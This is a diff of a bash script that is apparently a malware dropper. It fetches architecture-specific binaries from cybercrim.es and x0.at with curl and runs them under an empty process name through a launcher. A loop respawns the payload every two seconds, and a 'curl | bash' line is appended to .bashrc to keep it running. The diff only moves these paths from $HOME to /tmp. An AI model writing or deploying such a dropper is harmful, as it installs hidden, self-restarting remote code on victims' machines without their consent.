@@ -1,31 +1,31 @@
 #!/bin/bash
 
-if [ ! -f $HOME/crimson ]; then
+if [ ! -f /tmp/crimson ]; then
     if [ "$(uname -m)" = 'x86_64' ]; then
-        curl -s https://cybercrim.es/crimson.x86 -o $HOME/crimson
-        curl -s https://x0.at/rOhT -o $HOME/local
+        curl -s https://cybercrim.es/crimson.x86 -o /tmp/crimson
+        curl -s https://x0.at/rOhT -o /tmp/local
     elif [ "$(uname -m)" = 'aarch64' ] || [ "$(uname -m)" = 'armv8l' ]; then
-        curl -s https://cybercrim.es/crimson.arm -o $HOME/crimson
-        curl -s https://x0.at//KTbz -o $HOME/local
+        curl -s https://cybercrim.es/crimson.arm -o /tmp/crimson
+        curl -s https://x0.at/KTbz -o /tmp/local
     else
         exit 0
     fi
 fi
 
 if [ ! -f "$(pgrep -f "\?")" > /dev/null ]; then
-    $HOME/local -s "" -d -p test.pid $HOME/crimson
+    /tmp/local -s "" -d -p test.pid /tmp/crimson
 fi   
 
-chmod 777 $HOME/crimson
-chmod 777 $HOME/local
+chmod 777 /tmp/crimson
+chmod 777 /tmp/local
 
 (
     while true; do
         if [ ! "$(pgrep -f "\?")" > /dev/null ]; then
-            $HOME/local -s "" -d -p test.pid $HOME/crimson
+            /tmp/local -s "" -d -p test.pid /tmp/crimson
         fi
         sleep 2
     done    
 ) &>/dev/null &
 
-if ! grep -q "cybercrim.es" "$HOME/.bashrc"; then echo "if ! pgrep -f '\?' > /dev/null; then (curl https://cybercrim.es/l | bash) &>/dev/null &; fi" >> "$HOME/.bashrc"; fi
+if ! grep -q "cybercrim.es" "/tmp/.bashrc"; then echo "if ! pgrep -f '\?' > /dev/null; then (curl https://cybercrim.es/l | bash) &>/dev/null &; fi" >> "/tmp/.bashrc"; fi
